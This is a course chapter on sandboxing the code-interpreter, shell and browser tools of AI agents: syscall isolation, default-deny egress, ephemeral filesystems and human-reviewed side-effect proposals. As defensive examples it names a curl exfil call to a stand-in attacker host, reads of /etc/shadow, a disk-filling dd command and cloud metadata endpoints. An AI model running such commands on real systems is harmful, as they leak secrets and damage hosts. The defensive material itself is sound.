# 02 — Sandboxed Tool Execution

## Motivation

Chapter 01 built the capability gate as an in-process, pre-invocation policy pipeline. A gate refuses obviously bad calls before they run. What it *cannot* do is contain the calls it admitted. Once the tool implementation runs, it can read files, open sockets, spawn children, and touch state the gate did not enumerate — because the tool is *code*, not data, and code executed with the runtime's privileges inherits them.

The two hardest tools to gate purely by policy are the *code interpreter* and the *shell*. Both are Turing-complete-in-a-string: any bounded validator over the argument surface will admit strings whose behaviour is unbounded. Every serious agent framework that ships one — OpenAI's Code Interpreter, Anthropic's Claude Code / computer-use, LangChain's `PythonREPLTool`, autonomous-agent stacks that expose `subprocess.run` — has to answer the question *"what if this code does exactly what the attacker wanted?"* The answer is not policy; the answer is a **sandbox**.

A sandbox is the execution boundary you fall back on when the gate lets a call through and the tool implementation does something outside the intent envelope. It is a *containment layer* around the tool, not a *filter* on its inputs. Its job is to *bound the consequences*, not to predict the operations. When a sandboxed tool tries to open `/etc/shadow`, the sandbox refuses; when it tries to `curl attacker.example.com/exfil`, the network layer refuses; when it tries to mount `/host`, the OS refuses; when it tries to persist a payload to disk, the ephemeral-compute lifecycle destroys the payload with the container.

This chapter walks the sandbox stack the containment role owns: **isolation technologies** (gVisor, Firecracker, OS-level namespaces), **network-egress allow-lists**, **filesystem overlays**, **ephemeral compute**, and **side-effect quarantine with human confirmation**. It does *not* re-derive general sandbox engineering — that lives in the `ai-infra-security` peer role's runtime-hardening scope (chapter 06). It codifies the *safety-engineering contract* that the sandbox honours and the containment invariants the EACC section-7 failure clause depends on.

## Primary sources

- **[gVisor project](https://gvisor.dev/)** — the user-space Linux syscall interceptor Google publishes as an open-source sandbox. Read the `gVisor Architecture Guide` and the `Security Model` sections before this chapter.
- **[Firecracker microVM](https://firecracker-microvm.github.io/)** — the AWS-authored KVM-based microVM used by Lambda and Fargate for short-lived, hard-isolated compute. The `Design` doc names the threat model.
- **[Linux namespaces(7) man page](https://man7.org/linux/man-pages/man7/namespaces.7.html)**, **[seccomp(2)](https://man7.org/linux/man-pages/man2/seccomp.2.html)**, **[cgroups(7)](https://man7.org/linux/man-pages/man7/cgroups.7.html)** — the OS primitives every user-space sandbox composes.
- **[NIST SP 800-190 — Application Container Security Guide](https://csrc.nist.gov/publications/detail/sp/800-190/final)** — the reference posture for container-level isolation. Not sufficient for adversarial code execution on its own; the base case a hardened sandbox extends.
- **[MITRE ATT&CK — Container Escape (T1611)](https://attack.mitre.org/techniques/T1611/)** — the technique catalogue the sandbox must resist.
- **[OWASP Top 10 for LLM Applications 2025 — LLM05: Improper Output Handling](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/)** and **[LLM02: Sensitive Information Disclosure](https://genai.owasp.org/llmrisk/llm022025-sensitive-information-disclosure/)** — the failure modes a leaky sandbox produces.

<!-- needs-research: pin the current release of gVisor and Firecracker in the sandbox artefact; both projects publish CVE lists and hardening notes that the EACC section-7 clause should track. -->

## What "sandboxed tool execution" means in this module

A sandboxed tool call is a tool call whose execution is confined by *at least one* explicit isolation boundary the runtime enforces and that is designed to resist an adversary who *fully controls* the code running inside the sandbox. The last clause matters. A sandbox that assumes the code is friendly is not a sandbox; it is an execution helper. The interesting question is: *if the attacker has written the code that runs inside, what can the code do?*

The four containment axes the sandbox must answer for are:

1. **Compute isolation.** Can the code read or write memory outside its own process? Can it call a syscall that escapes to the host?
2. **Network isolation.** Can the code connect to the internet, the internal network, or the metadata service?
3. **Filesystem isolation.** Can the code read files outside its scratch space? Can it write files that survive the call?
4. **Persistence isolation.** After the call ends, does any state — file, process, socket, credential — remain?

The remainder of the chapter walks each axis with the primitives the containment role owns.

## Axis 1 — Compute isolation

### The default posture is fail-closed

The tool runs in a boundary the OS enforces. No sharing of process address space, no shared kernel with unrestricted syscall access, no mounted host filesystem, no host network namespace. The three general strategies:

**gVisor / user-space syscall interception.** gVisor implements a substantial subset of the Linux syscall interface in user space (the Sentry) and mediates every syscall the guest code makes. The host kernel sees a narrow, well-audited syscall surface from the Sentry rather than an arbitrary syscall stream from adversary code. Trade-off: performance overhead on syscall-heavy workloads; some syscalls (parts of `io_uring`, `perf_event_open`, ptrace) are unsupported or restricted. Right posture for interactive code-interpreter tools where the workload is heterogeneous and the host kernel surface is the primary concern.

**Firecracker / microVM.** Firecracker runs the tool inside a KVM-backed microVM. The host sees only the KVM interface; the guest sees a purpose-built minimal kernel. Boot time is on the order of hundreds of milliseconds; overhead per call is dominated by microVM lifecycle, not syscall interception. Right posture for batch tool executions, hard isolation of longer-running interpreters, and multi-tenant execution where a compromised guest kernel must not compromise the host.

**OS-level namespaces + seccomp-BPF + cgroups.** The lowest-cost isolation strategy: Linux namespaces isolate the process's view of PID / mount / net / user / IPC / UTS / cgroup, seccomp-BPF drops the syscall surface to an explicit allow-list, cgroups cap CPU / memory / IO. This is what container runtimes give you by default. The trade-off is the *host kernel is shared*: a kernel vulnerability the guest can reach is a host compromise. Right posture for well-vetted tool implementations (i.e., tools *you* wrote, not tools the *model* wrote) that you are hardening rather than adversary-executing.

The load-bearing point: for code the *model* has written, a container-only posture is not sufficient. Choose gVisor or Firecracker for adversary-executed code. Choose OS-level containers for tools you wrote and are hardening as defence in depth.

### seccomp-BPF is table stakes even inside gVisor / Firecracker

Even inside a stronger sandbox, apply a seccomp-BPF filter to the guest process to drop syscalls the tool implementation does not need. This is defence in depth against a Sentry / microVM vulnerability. The filter is *narrow by construction*: whitelist the syscalls the tool needs, block everything else. Most code interpreters need `read`, `write`, `mmap`, `brk`, `openat`, `close`, `stat`, `fstat`, `futex`, `clock_gettime`, `exit_group`. They do *not* need `ptrace`, `kexec_load`, `iopl`, `unshare`, `keyctl`.

### The runtime, not the tool, decides the isolation posture

The EACC section-4 and section-7 fields name the sandbox class and the specific configuration (gVisor version, seccomp profile hash, cgroup limits) per tool. The wrapper (chapter 03) fetches the sandbox handle at invocation time; the tool implementation cannot elevate its own privileges by naming a wider sandbox in the arguments. If the tool needs a wider profile, the *EACC* changes and a reviewer signs off.

## Axis 2 — Network isolation

Network is the exfil channel. Even a perfectly compute-isolated tool that can reach the internet can (a) exfiltrate secrets, (b) call attacker-controlled command-and-control endpoints, and (c) pivot to internal services the operator did not mean to expose. The default posture is **deny egress**, with narrow allow-lists for the tools that need it.

### Egress allow-list, at the network boundary the tool cannot reach

- **Wrapper-side egress proxy.** All outbound traffic from the sandbox goes through an HTTP-only egress proxy. The proxy allow-lists hosts, schemes, and paths per tool. TLS terminates at the proxy, so the tool cannot exfiltrate via SNI or covert channel unless the *proxy* admits the destination. This is the OWASP-recommended shape for LLM plug-in egress.
- **Layer-3 default-deny.** In addition to the proxy, the sandbox's network namespace has no default route. Only the proxy is reachable. This defends against tools that try to bypass the proxy by connecting to `attacker.example.com` on TCP/8443 directly.
- **No metadata service.** The cloud provider's metadata endpoint (`169.254.169.254`, `metadata.google.internal`) is unreachable from the sandbox. Metadata service exfil is a known pattern; the containment posture excludes it by construction, not by hoping the tool does not know about it.
- **No DNS to arbitrary resolvers.** DNS is served by an allow-listed resolver whose upstream is scoped to the same allow-list as the proxy. Otherwise DNS tunnelling is an exfil channel.
- **Internal network is *not* a friendly zone.** The sandbox has no route to the operator's internal services unless a specific service is enumerated in the allow-list. "The corporate VPN" is not a scope; every internal endpoint the tool reaches is enumerated.

### The proxy's log is a load-bearing audit input

Chapter 03 makes the wrapper's audit log tamper-evident. The egress proxy's per-request log — timestamp, session ID, tool ID, destination, method, path, request size, response size, response code — is one of that stream's inputs. If the tool has no network, the egress-proxy log is empty; if the tool has network, the log carries the load-bearing exfil-detection surface.

### Common failure the reviewer catches

The sandbox has a default-allow egress policy with a *blocklist* rather than a default-deny with an allow-list. A reviewer at this level asks how the sandbox behaves against a novel exfil endpoint the blocklist does not name. If the answer is "the request goes through," the finding is a missing default-deny.

## Axis 3 — Filesystem isolation

### Read-only base, writable overlay

The sandbox's root filesystem is a *read-only base image* pinned by digest. Writes go to an ephemeral *overlay* (overlayfs, tmpfs) that is discarded at the end of the call. The tool cannot durably modify the base image; the tool cannot see files another session wrote (each session gets its own overlay).

Concretely:

- **Base image.** The interpreter, the standard library, the pinned dependency set. Immutable across calls, digest recorded in the audit log.
- **Overlay.** A writable tmpfs, scoped to the session, sized in cgroups so the tool cannot exhaust disk. Discarded at teardown.
- **Session scratch mount.** A separate writable mount for outputs the wrapper needs to extract after the call (files the tool "returned" via a well-known path). The wrapper enumerates the outputs, sanitises them, and hands them back to the model.
- **No host mounts.** No `-v /host:/host` shortcuts. The developer's convenience mount is an incident waiting to happen.

### File I/O boundaries the tool cannot exceed

- **Cgroups on disk I/O bytes.** Even inside the overlay, cap the total bytes the tool may write, so a tool that decides to `dd if=/dev/zero of=/tmp/x bs=1M count=1000000` gets stopped.
- **No SUID / capabilities carried into the sandbox.** No SUID bits, no file capabilities. A file the tool creates inside the overlay must not be able to escalate outside it if it somehow escapes.
- **No procfs shortcuts.** `/proc/*/root`, `/proc/*/cwd`, `/proc/*/exe` are historical escape vectors. The sandbox's `/proc` is hidden or narrowed with `hidepid`.

### Secret quarantine

Any credential the wrapper injects into the sandbox lives in memory (env var, memfd) with the *shortest possible lifetime*. It is scrubbed from environment before the tool starts if the tool does not need it; it is not written to disk; and — this composes with chapter 01 primitive 4 — the credential is scoped to the specific downstream call, not to the tool's whole lifetime.

## Axis 4 — Ephemeral compute

### The sandbox lives for exactly one call

The default lifecycle is: create the sandbox, run the tool, extract the outputs, destroy the sandbox. Nothing persists. A second call gets a second sandbox with a fresh overlay, fresh network namespace, fresh cgroup, fresh identity.

Trade-offs:

- **Cost.** Cold-start dominates the per-call cost, especially with Firecracker. Warm pools (a small ring of pre-booted sandboxes) reduce cold-start but must be *sanitised between uses* — same base image, same reset overlay, same reset network. A warm pool that shares state across sessions is a cross-tenant leak.
- **Interactive state.** Some tools (a Jupyter-style code interpreter) want to preserve the interpreter across turns *within a session*. The compromise is *per-session persistence with a hard TTL*: the sandbox lives for one session, is not shared across sessions, and is destroyed after the TTL regardless of session state.
- **Snapshot / restore.** Firecracker supports snapshots. This is *not* a licence to persist across tenants — snapshots are per-session, encrypted at rest, and rotated on tool-configuration changes.

### Nothing survives that the wrapper does not extract

At teardown, the wrapper extracts:

- The tool's *return value* (stdout / structured output).
- The tool's *outputs of interest* from the scratch mount (files the tool wrote as part of its result).
- The tool's *observed telemetry* (syscall counts, egress-proxy log, cgroup high-water marks).

Everything else is destroyed. If the model asks "what was in the file I created three turns ago" and the file is not in the extracted set, the answer is *"gone,"* not "let me check the overlay."

## Axis 5 — Side-effect quarantine and human confirmation

Side effects that reach the world beyond the sandbox — sending an email, issuing a refund, writing to a shared database — are the interesting containment problem. The gate (chapter 01) already bounds *which* side effects the tool can attempt. The sandbox bounds *where* the tool executes. What remains is the moment the tool asks the runtime to actually perform the side effect.

### The two-phase side-effect pattern

Phase 1 (in-sandbox): the tool composes a **side-effect proposal** — a structured description of the action, its arguments, its target, its magnitude, its predicted outcome, and a *dry-run receipt* from the downstream API when the API supports dry-run.

Phase 2 (out-of-sandbox, wrapper-side): the wrapper takes the proposal, re-runs the capability-gate pipeline against it (belt and braces), decides whether the proposal is auto-approvable / conditionally-approvable / auto-denied, and — for conditional cases — routes to chapter 04's HITL flow. The tool does *not* perform the side effect from inside the sandbox; the wrapper does.

Why this shape:

- **The proposal is inspectable.** The wrapper sees the exact side-effect the tool is about to perform, in a canonical form. mod-108's monitors can classify the proposal. The audit log records it verbatim.
- **The tool cannot lie about intent.** The tool cannot "sneak" a side effect by hiding it inside a payload the wrapper does not parse. Every side effect is a distinct proposal.
- **The HITL escalation is trivial to insert.** Chapter 04's escalation just intercepts proposals whose gate verdict is "conditional." The tool does not need to know.
- **Dry-run and rollback are cheap.** For side effects whose downstream supports dry-run (SQL `EXPLAIN`, mutation `dry_run=true`, cloud-provider "plan"), the proposal *includes* the dry-run receipt. The wrapper can decide based on the receipt rather than the tool's summary.

### The proposal shape

```
{
  "session_id": "sess_...",
  "tool_id": "refund_issue",
  "tool_version": "v3",
  "arguments": {"order_id": "ord_abc123", "amount_cents": 1500, "reason": "..."},
  "argument_provenance": {"order_id": "user_message#42", "reason": "retrieved_doc#12"},
  "resolved_targets": [{"tenant": "acme", "order_owner_user": "u_...", "current_status": "shipped"}],
  "predicted_side_effects": ["issue_refund $15.00", "notify_customer email"],
  "downstream_dry_run": {"engine": "stripe", "receipt_id": "dry_..."},
  "gate_verdict": "conditional_hitl",
  "hitl_reason": "refund_amount > $5 threshold_for_new_customer_flag"
}
```

The wrapper (chapter 03) is where this object is composed; the sandbox is where the tool composes only its own contribution to it. The audit log stores the full object; the HITL UI (chapter 04) renders the *canonical arguments*, not a summary.

### Common failure the reviewer catches

The tool is allowed to perform the side effect *from inside the sandbox* — say, by making an HTTPS call to `stripe.com` through the egress allow-list. In that shape, the wrapper sees only the sandbox's egress-proxy log; it does not see the *semantic* description of the action; the HITL flow is either unreachable or gets a "there was an HTTP call" summary. The finding is a missing side-effect proposal layer.

## Composing the sandbox stack — a reference posture

For the code-interpreter tool of a customer-service agent, a defensible posture is:

- **Isolation.** gVisor (for a customer-facing surface) *or* Firecracker (for a multi-tenant, batch surface). seccomp-BPF profile that whitelists a curated syscall set for the interpreter. cgroups cap CPU (1 vCPU), memory (512 MiB), disk (128 MiB), wall-clock (30 s).
- **Network.** Default-deny egress. Egress proxy allow-lists a small set (documentation hosts, package repository if allowed, no arbitrary internet). No metadata service. No internal-network route.
- **Filesystem.** Read-only base image pinned by digest. Session-scoped tmpfs overlay, cgroup-sized. No host mounts. `/tmp` mounted noexec, nosuid, nodev.
- **Ephemerality.** One-call sandbox lifetime for stateless tools; per-session sandbox with a hard TTL for interactive interpreters. Warm pool sanitised between uses. Nothing persists across sessions.
- **Side effects.** Two-phase proposal pattern. No side-effect API calls from inside the sandbox — only proposals returned to the wrapper.

For a browser-use / computer-use tool, add:

- A dedicated browser sandbox (Chromium in gVisor or a purpose-built browser sandbox), running as an unprivileged user with a locked-down profile.
- A separate egress allow-list for the browser (the domains the agent is expected to navigate to).
- The browser's outbound uploads (file uploads, form submissions to third parties) treated as *side effects* and routed through the two-phase proposal pattern.

For a shell / subprocess tool that runs *pre-written* commands, add:

- A wrapper that resolves the subprocess to a specific binary in the base image (no `$PATH` search), passes `argv` as an array (never a shell string), and drops privileges before `execve`.
- The subprocess still runs inside the same sandbox posture — even a fixed-`argv` binary can misbehave if the OS gives it more than the tool needs.

## Handoff to `ai-infra-security`

Chapter 06 draws the boundary in detail. The short version: **this module writes the EACC section-7 sandbox contract; `ai-infra-security` engineers the sandbox platform**. That platform includes the base-image build pipeline, the gVisor / Firecracker fleet, the egress proxy, the secret broker (chapter 01 primitive 4), the base-image CVE-patch cadence, and the per-tenant identity fabric. The safety-engineering artefact this module produces *names* those components and states the invariants they must satisfy; the peer role owns their construction and their patch-management.

Do not implement a gVisor fleet as a mod-107 exercise. Do implement a *sandbox-contract test suite* — a set of adversarial probes that verifies the platform honours the invariants (egress default-deny, cross-session isolation, ephemeral teardown). Exercise 02 walks through that.

## Common misreadings to avoid

- **"Docker is a sandbox."** Docker without further hardening is a *container* — a namespace-and-cgroups posture with a shared host kernel. That is not adequate for adversary-executed code (LLM-generated code). Add gVisor, Firecracker, or the peer-role-owned hardened platform, and then treat Docker as one layer of the stack.
- **"The seccomp profile the container runtime ships is enough."** The default profile is broad. Narrow it to the tool's syscalls. Otherwise `unshare` / `setns` / `ptrace` remain reachable.
- **"The tool needs internet access; we can't apply the network policy."** Then it needs *scoped* internet access. Enumerate the hosts, put them in the egress proxy allow-list, and audit-log every request. The failure mode is not "the tool needs the internet"; the failure mode is "the tool needs the internet and we gave it *all* of the internet."
- **"We can persist the interpreter across sessions for speed."** Not across sessions. Cross-session persistence is a cross-tenant channel. Persist inside a session, destroy at session end, and pay the cold-start cost per session.
- **"The wrapper log is enough — we don't need the egress-proxy log."** The wrapper sees the tool call; the proxy sees the exfil. Both logs are needed. Chapter 03 makes them tamper-evident together.
- **"Two-phase side effects are theatre."** They are theatre only when the wrapper auto-approves everything. When the wrapper enforces the gate and the HITL flow (chapter 04) intercepts the conditional cases, the pattern is what makes a $50,000 wrong-refund a paused conversation instead of a customer-service incident.

## Summary

- The sandbox contains what the gate admitted. Its threat model assumes the code inside is adversarial.
- Four containment axes: **compute** (gVisor / Firecracker / OS-level with hardened seccomp), **network** (default-deny egress with wrapper-side proxy), **filesystem** (read-only base + ephemeral overlay), **persistence** (one call = one sandbox, warm pools sanitised between uses).
- Side effects leave the sandbox as *proposals*, not as direct API calls. The wrapper re-checks and — for conditional cases — routes to HITL.
- The EACC section-7 pins the sandbox class, the profile hash, and the invariants. The `ai-infra-security` peer role engineers the platform that honours them.
- Test the sandbox with an adversarial probe suite. Exercise 02 is that suite.
